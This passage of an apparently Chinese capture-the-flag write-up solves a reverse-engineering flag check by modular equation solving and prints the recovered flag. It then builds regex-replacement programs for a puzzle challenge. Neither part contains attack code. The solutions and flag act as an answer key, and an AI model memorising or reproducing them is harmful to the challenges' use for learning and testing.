</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">36</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">sum</span> <span class="o">+=</span> <span class="n">values</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">*</span> <span class="n">product</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">product</span> <span class="o">*=</span> <span class="n">mint</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">sum</span><span class="p">.</span><span class="n">value</span><span class="p">()</span> <span class="o">!=</span> <span class="n">DAT_00105020</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;Failed, please try again!&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>需要输入一个长度为 36 的字符串 <code>inputArray</code>，计算结果要与与 <code>DAT_00105020</code> 一致。</p>
<p><code>mint</code> 会把输入的数对 998244353 取模，相当于以下函数：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">calculate_sum</span><span class="p">(</span><span class="n">char_values</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sums</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">37</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">sum_i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">product</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">36</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">sum_i</span> <span class="o">+=</span> <span class="n">char_values</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">*</span> <span class="n">product</span>
</span></span><span class="line"><span class="cl">            <span class="n">sum_i</span> <span class="o">%=</span> <span class="mi">998244353</span>
</span></span><span class="line"><span class="cl">            <span class="n">product</span> <span class="o">*=</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">            <span class="n">product</span> <span class="o">%=</span> <span class="mi">998244353</span>
</span></span><span class="line"><span class="cl">        <span class="n">sums</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">sum_i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">sums</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">string</span> <span class="o">=</span> <span class="s1">&#39;flag_input_string_here&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">string</span> <span class="o">+=</span> <span class="s1">&#39; &#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">36</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">char_values</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">string</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">sums</span> <span class="o">=</span> <span class="n">calculate_sum</span><span class="p">(</span><span class="n">char_values</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">sums</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>用以下代码提取 <code>DAT_00105020</code>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">hexString</span> <span class="o">=</span> <span class="s1">&#39;f6 0c 00 00 09 07 c8 16 da 7b 6b 08 9e ee fb 05 c1 ff d1 24 e2 6a f7 16 05 33 f0 15 f9 23 8c 21 c1 3a 16 33 6e c1 32 03 a7 b4 e7 27 73 80 1d 24 22 f1 c6 01 13 de 73 2d 09 0a fc 07 b7 f7 50 0d dd b1 61 02 8e bb e5 37 c5 1d a7 0d 0c f2 c3 2d 3a b1 cc 00 e4 41 63 2f db 11 06 0b 1a 2a 38 0a b2 09 3c 10 88 be e2 1c 15 fd a9 19 c1 cf 21 26 ac de 70 29 aa 63 a4 08 31 6d 6c 11 78 91 2e 22 dd c9 b9 33 35 d0 98 2f 7a 17 b8 00 e8 11 26 34&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">hexBytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hexString</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">ints</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">hexBytes</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">],</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">hexBytes</span><span class="p">),</span> <span class="mi">4</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ints</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>扔给 Mathematica 解方程：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mathematica" data-lang="mathematica"><span class="line"><span class="cl"><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">998244353</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">3318</span><span class="p">,</span><span class="w"> </span><span class="mi">382207753</span><span class="p">,</span><span class="w"> </span><span class="mi">141261786</span><span class="p">,</span><span class="w"> </span><span class="mi">100396702</span><span class="p">,</span><span class="w"> </span><span class="mi">617742273</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">385313506</span><span class="p">,</span><span class="w"> </span><span class="mi">368063237</span><span class="p">,</span><span class="w"> </span><span class="mi">562832377</span><span class="p">,</span><span class="w"> </span><span class="mi">857094849</span><span class="p">,</span><span class="w"> </span><span class="mi">53657966</span><span class="p">,</span><span class="w"> </span><span class="mi">669496487</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">605913203</span><span class="p">,</span><span class="w"> </span><span class="mi">29815074</span><span class="p">,</span><span class="w"> </span><span class="mi">762568211</span><span class="p">,</span><span class="w"> </span><span class="mi">133958153</span><span class="p">,</span><span class="w"> </span><span class="mi">223410103</span><span class="p">,</span><span class="w"> </span><span class="mi">39956957</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">937802638</span><span class="p">,</span><span class="w"> </span><span class="mi">229055941</span><span class="p">,</span><span class="w"> </span><span class="mi">767816204</span><span class="p">,</span><span class="w"> </span><span class="mi">13414714</span><span class="p">,</span><span class="w"> </span><span class="mi">795034084</span><span class="p">,</span><span class="w"> </span><span class="mi">184947163</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">171452954</span><span class="p">,</span><span class="w"> </span><span class="mi">272370098</span><span class="p">,</span><span class="w"> </span><span class="mi">484621960</span><span class="p">,</span><span class="w"> </span><span class="mi">430570773</span><span class="p">,</span><span class="w"> </span><span class="mi">639750081</span><span class="p">,</span><span class="w"> </span><span class="mi">695262892</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">144991146</span><span class="p">,</span><span class="w"> </span><span class="mi">292318513</span><span class="p">,</span><span class="w"> </span><span class="mi">573477240</span><span class="p">,</span><span class="w"> </span><span class="mi">867813853</span><span class="p">,</span><span class="w"> </span><span class="mi">798543925</span><span class="p">,</span><span class="w"> </span><span class="mi">12064634</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">874910184</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">102</span><span class="p">,</span><span class="w"> </span><span class="mi">108</span><span class="p">,</span><span class="w"> </span><span class="mi">97</span><span class="p">,</span><span class="w"> </span><span class="mi">103</span><span class="p">,</span><span class="w"> </span><span class="mi">95</span><span class="p">,</span><span class="w"> </span><span class="mi">105</span><span class="p">,</span><span class="w"> </span><span class="mi">110</span><span class="p">,</span><span class="w"> </span><span class="mi">112</span><span class="p">,</span><span class="w"> </span><span class="mi">117</span><span class="p">,</span><span class="w"> </span><span class="mi">116</span><span class="p">,</span><span class="w"> </span><span class="mi">95</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">115</span><span class="p">,</span><span class="w"> </span><span class="mi">116</span><span class="p">,</span><span class="w"> </span><span class="mi">114</span><span class="p">,</span><span class="w"> </span><span class="mi">105</span><span class="p">,</span><span class="w"> </span><span class="mi">110</span><span class="p">,</span><span class="w"> </span><span class="mi">103</span><span class="p">,</span><span class="w"> </span><span class="mi">95</span><span class="p">,</span><span class="w"> </span><span class="mi">104</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span><span class="p">,</span><span class="w"> </span><span class="mi">114</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">calculate</span><span class="p">[</span><span class="nv">string_</span><span class="p">]</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="n">Table</span><span class="p">[</span><span class="n">Sum</span><span class="p">[</span><span class="n">string</span><span class="p">[[</span><span class="n">j</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">]]</span><span class="w"> </span><span class="n">i</span><span class="o">^</span><span class="n">j</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="n">j</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">35</span><span class="p">}],</span><span class="w"> </span><span class="p">{</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="mi">36</span><span class="p">}]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">vars</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Table</span><span class="p">[</span><span class="n">Subscript</span><span class="p">[</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">],</span><span class="w"> </span><span class="p">{</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="mi">36</span><span class="p">}];</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Solve</span><span class="p">[</span><span class="n">calculate</span><span class="o">@</span><span class="n">vars</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="n">vars</span><span class="p">,</span><span class="w"> </span><span class="n">Modulus</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">p</span><span class="p">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">vars</span><span class="w"> </span><span class="o">/.</span><span class="w"> </span><span class="n">Flatten</span><span class="o">@</span><span class="n">result</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">FromCharacterCode</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>得到 <code>flag{yoU_Are_THE_mA$T3r_of_l@gR4nGe}</code></p>
<br>
<h2 id="algorithm">Algorithm</h2>
<h3 id="18-关键词过滤喵谢谢喵">18. 关键词过滤喵，谢谢喵</h3>
<p>当年用正则表达式写 Markdown 转 HTML（程序设计 2 大作业）的时候，正则玩得比较熟练，以至于今年一血了这道题。又是一道二次元题（去年的是 <a href="https://gwdx.github.io/post/hackergame2022/#16-%E4%BA%8C%E6%AC%A1%E5%85%83%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C">二次元神经网络</a>）</p>
<blockquote>
<p>这题需要修改评测脚本，自己写一些样例，进行 debug</p>
</blockquote>
<h4 id="字数统计喵">字数统计喵</h4>
<p>所有字符都是等价的，所以先全替换为 <code>A</code>，每两个数位间用 <code>d</code> 隔开。10 个 <code>A</code> 换成 <code>B</code>，10 个 <code>B</code> 换成 <code>C</code>……如果不到 10 个就换成相应的数字</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;1
</span></span></span><span class="line"><span class="cl"><span class="s1">重复把【[^A]】替换成【A】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">把【$】替换成【d】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">把【^】替换成【0】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">letters</span> <span class="o">=</span> <span class="s1">&#39;ABCDE&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">letters</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">l1</span> <span class="o">=</span> <span class="n">letters</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">l2</span> <span class="o">=</span> <span class="n">letters</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;重复把【</span><span class="si">{</span><span class="mi">10</span><span class="o">*</span><span class="n">l1</span><span class="si">}</span><span class="s1">】替换成【</span><span class="si">{</span><span class="n">l2</span><span class="si">}</span><span class="s1">】喵</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;把【(</span><span class="si">{</span><span class="n">l2</span><span class="si">}</span><span class="s1">+)】替换成【</span><span class="se">\\</span><span class="s1">1d】喵</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;重复把【</span><span class="si">{</span><span class="n">i</span><span class="o">*</span><span class="n">l1</span><span class="si">}</span><span class="s1">】替换成【</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">】喵</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;把【(\d)d】替换成【</span><span class="se">\\</span><span class="s1">1】喵</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;把【d】替换成【0】喵</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;把【^0+】替换成【】喵</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;把【^$】替换成【0】喵</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">+=</span> <span class="s1">&#39;谢谢喵</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="排序喵">排序喵</h4>
<p>只用正则表达式就能搞定</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">2
</span></span><span class="line"><span class="cl">把【$】替换成【\n】喵
</span></span><span class="line"><span class="cl">把【\n+】替换成【\n】喵
</span></span><span class="line"><span class="cl">把【(.+)】替换成【\1\t\1】喵
</span></span><span class="line"><span class="cl">重复把【(\tA*)[^A\n]】替换成【\1A】喵
</span></span><span class="line"><span class="cl">重复把【(.+\t(A+))\n(.+\t\2A+)】替换成【\3\n\1】喵
</span></span><span class="line"><span class="cl">重复把【((.+\t(?:A+)\n)+)(?:(.+)\t(?:A+))】替换成【\3\n\1】喵
</span></span><span class="line"><span class="cl">把【(.+)\tA+】替换成【\1】喵
</span></span><span class="line"><span class="cl">谢谢喵
</span></span></code></pre></td></tr></table>
</div>
</div><p>思路：先去掉空行，把每行换成 <code>abc\tAAA</code> 的形式，用正则表达式第一个参数的捕获来确定长度的大小关系，核心是这句：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">重复把【(.+\t(A+))\n(.+\t\2A+)】替换成【\3\n\1】喵
</span></span></code></pre></td></tr></table>
</div>
</div><p>不过这样是从大到小排序的，需要改成从小到大排序：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">重复把【((.+\t(?:A+)\n)+)(?:(.+)\t(?:A+))】替换成【\3\n\1】喵
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="brainfuck-喵">Brainfuck 喵</h4>
<p>构造代码区、左侧数据区、右侧数据区、输出区域。</p>
<ul>
<li>代码区是将来要执行的代码</li>
<li>左侧数据区记录指针左侧的数据</li>
<li>右侧数据区记录指针及右侧的数据</li>
<li>输出区域记录输出的字符串</li>
</ul>
<blockquote>
<p>数据区均用 <code>,</code> 分隔，并且使用 <code>1</code> 的个数来表示字符</p>
</blockquote>
<p>示例：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+.&gt;&gt;.&lt;-.&lt;.+++.------.--------.&gt;&gt;+.&gt;++.
</span></span><span class="line"><span class="cl">0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1111111111111111111111111111111111110,
</span></span><span class="line"><span class="cl">111111111111111111111111111111110,111111110,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
</span></span><span class="line"><span class="cl">1111111111111111111111111111111111111111111111111111111111111111111111110,
</span></span></code></pre></td></tr></table>
</div>
</div><p>首先移除注释的字符，将 <code>[</code> <code>]</code> 配对，替换为 <code>A</code> <code>B</code> <code>C</code>……</p>
<p>对于将要执行的字符，</p>
<ul>
<li>如果是 <code>&gt;</code>，将右侧数据区的第一个移到左侧</li>
<li>如果是 <code>&lt;</code>，将左侧数据区的最后一个移到右侧</li>
<li>如果是 <code>+</code>，将左侧数据区的第一个加一（前面添加一个 <code>1</code>）</li>
<li>如果是 <code>-</code>，将左侧数据区的第一个减一（前面添加一个 <code>9</code>）</li>
<li>如果是 <code>.</code>，将左侧数据区的第一个添加到输出区域</li>
<li>如果是字母（循环开始），计算当前指向的值，如果是 0，跳过循环（到对应字母处），否则继续循环（将循环体复制出来一遍）</li>
</ul>
<p>重复上述步骤，直到代码区为空。最后将输出区域的数据转换为字符串。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">prevsize</span> <span class="o">=</span> <span class="mi">20</span>
</span></span><span class="line"><span class="cl"><span class="n">nextsize</span> <span class="o">=</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">prev0</span> <span class="o">=</span> <span class="s1">&#39;0,&#39;</span> <span class="o">*</span> <span class="n">prevsize</span>
</span></span><span class="line"><span class="cl"><span class="n">next0</span> <span class="o">=</span> <span class="s1">&#39;0,&#39;</span> <span class="o">*</span> <span class="n">nextsize</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="sa">rf</span><span class="s1">&#39;&#39;&#39;3
</span></span></span><span class="line"><span class="cl"><span class="s1">把【[^&lt;&gt;\+\-\.\[\]]】替换成【】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">把【$】替换成【\n</span><span class="si">{</span><span class="n">prev0</span><span class="si">}</span><span class="s1">\n</span><span class="si">{</span><span class="n">next0</span><span class="si">}</span><span class="s1">\n】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">把【\[([^\[\]]*)\]】替换成【A\1A】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">把【\[([^\[\]]*)\]】替换成【B\1B】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">把【\[([^\[\]]*)\]】替换成【C\1C】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">把【\[([^\[\]]*)\]】替换成【D\1D】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">把【\[([^\[\]]*)\]】替换成【E\1E】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">把【\[([^\[\]]*)\]】替换成【F\1F】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">开始：
</span></span></span><span class="line"><span class="cl"><span class="s1">    把【^&gt;(.*)\n(.*)\n(\d+,)(.*)\n(.*)】替换成【\1\n\2\3\n\4\n\5】喵
